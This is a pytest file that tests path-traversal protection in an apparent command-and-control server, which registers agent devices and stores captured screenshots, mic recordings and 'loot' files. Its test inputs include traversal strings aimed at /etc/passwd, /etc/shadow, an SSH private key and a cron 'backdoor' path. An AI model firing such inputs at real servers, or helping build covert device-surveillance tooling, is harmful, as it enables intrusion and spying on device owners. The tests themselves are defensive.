"""Path traversal and stored-file containment."""

import os
from pathlib import Path

import pytest

from c2.file_handler import (
    safe_join,
    sanitize_filename,
    verify_stored_path,
)
from config import Config


# --------------------------------------------------------------- filenames

@pytest.mark.parametrize("raw", [
    "../../etc/passwd",
    "../../../root/.ssh/id_rsa",
    "/etc/shadow",
    "..\\..\\windows\\system32\\cfg",
    "sub/dir/name.txt",
    "....//....//etc/passwd",
])
def test_sanitize_strips_every_path_form(raw):
    out = sanitize_filename(raw)
    assert "/" not in out
    assert "\\" not in out
    assert ".." not in out
    assert out == Path(out).name


def test_sanitize_handles_empty_and_degenerate():
    assert sanitize_filename("") == "file.bin"
    assert sanitize_filename(None) == "file.bin"
    assert sanitize_filename("...") == "file.bin"
    assert sanitize_filename("/") == "file.bin"
    assert sanitize_filename("\x00") == "file.bin"


def test_sanitize_keeps_readable_extension_and_caps_length():
    out = sanitize_filename("photo.jpeg")
    assert out.endswith(".jpeg")

    long = sanitize_filename("a" * 400 + ".txt")
    assert len(long) <= 160
    assert long.endswith(".txt")


# --------------------------------------------------------------- safe_join

def test_safe_join_allows_nested_children(tmp_path):
    assert safe_join(tmp_path, "screenshot", "dev-1") == \
        (tmp_path / "screenshot" / "dev-1").resolve()


@pytest.mark.parametrize("evil", [
    "..",
    "../secret",
    "a/../../secret",
    "a/b/../../../etc/passwd",
])
def test_safe_join_refuses_traversal(tmp_path, evil):
    with pytest.raises(ValueError):
        safe_join(tmp_path, "to_agent", evil)


def test_safe_join_refuses_sibling_with_shared_prefix(tmp_path):
    """``to_agent_evil`` starts with ``to_agent`` but is a different folder."""
    base = tmp_path / "uploads"
    (base / "to_agent_evil").mkdir(parents=True)
    (base / "to_agent").mkdir(parents=True)

    with pytest.raises(ValueError):
        safe_join(base, "to_agent", "..", "to_agent_evil")

    # And the plain path resolves under to_agent, not the sibling.
    assert safe_join(base, "to_agent", "payload.apk") == \
        (base / "to_agent" / "payload.apk").resolve()


# ---------------------------------------------------------- verify_stored

def test_verify_stored_path_accepts_inside_and_rejects_outside():
    root = Path(Config.UPLOAD_FOLDER)
    inside = root / "mic" / "dev-1" / "blob.m4a"
    inside.parent.mkdir(parents=True, exist_ok=True)
    inside.write_bytes(b"x")

    assert verify_stored_path(str(inside)) == str(inside.resolve())
    assert verify_stored_path("/etc/passwd") is None
    assert verify_stored_path(str(root.parent / "escape.bin")) is None
    assert verify_stored_path(str(root)) is None
    assert verify_stored_path("") is None
    assert verify_stored_path(None) is None


# ------------------------------------------------------------ http routes

def test_agent_download_rejects_traversal(client):
    client.post("/api/agent/register", json={"device_id": "d1"},
                headers={"X-Api-Key": "test-agent-key"})
    for evil in ["../../etc/passwd", "..%2f..%2fetc%2fpasswd", ".."]:
        r = client.get(f"/api/agent/download/{evil}",
                       headers={"X-Api-Key": "test-agent-key"})
        assert r.status_code in (403, 404), f"{evil} -> {r.status_code}"
        assert b"root:" not in r.data


def test_agent_download_requires_key(client):
    r = client.get("/api/agent/download/whatever.apk")
    assert r.status_code == 401


def test_upload_with_traversal_filename_stays_inside_uploads(client, make_device):
    make_device("dev-traverse")
    from io import BytesIO

    r = client.post(
        "/api/agent/upload",
        data={
            "device_id": "dev-traverse",
            "category": "../../escape",
            "file": (BytesIO(b"payload"), "../../../../etc/cron.d/backdoor"),
        },
        headers={"X-Api-Key": "test-agent-key"},
        content_type="multipart/form-data",
    )
    assert r.status_code == 200

    from database import db
    from models import CapturedFile

    with client.application.app_context():
        cf = CapturedFile.query.filter_by(device_id=1).first()
        assert cf is not None
        stored = Path(cf.stored_path).resolve()
        upload_root = Path(Config.UPLOAD_FOLDER).resolve()
        assert upload_root in stored.parents
        assert ".." not in stored.name
        assert cf.category == "escape"


def test_stored_files_are_not_reachable_through_static(client, make_device):
    """Captures must not be servable by the static file handler."""
    from io import BytesIO

    make_device("dev-static")
    client.post(
        "/api/agent/upload",
        data={"device_id": "dev-static",
              "file": (BytesIO(b"secret-bytes"), "loot.txt")},
        headers={"X-Api-Key": "test-agent-key"},
        content_type="multipart/form-data",
    )

    from database import db
    from models import CapturedFile

    with client.application.app_context():
        cf = CapturedFile.query.filter_by(device_id=1).first()
        relative = Path(cf.stored_path).relative_to(Path(Config.UPLOAD_FOLDER))

    r = client.get(f"/static/uploads/{relative}")
    assert r.status_code == 404
    assert b"secret-bytes" not in r.data


def test_raw_file_route_requires_session(app, op, make_device):
    from io import BytesIO

    make_device("dev-raw")
    app.test_client().post(
        "/api/agent/upload",
        data={"device_id": "dev-raw",
              "file": (BytesIO(b"secret-bytes"), "loot.txt")},
        headers={"X-Api-Key": "test-agent-key"},
        content_type="multipart/form-data",
    )

    from models import CapturedFile

    with app.app_context():
        file_id = CapturedFile.query.filter_by(device_id=1).first().id

    # `op` and a fresh client are distinct sessions; the fresh one is anonymous.
    assert app.test_client().get(f"/api/file/{file_id}/raw").status_code == 401
    assert op.get(f"/api/file/{file_id}/raw").status_code == 200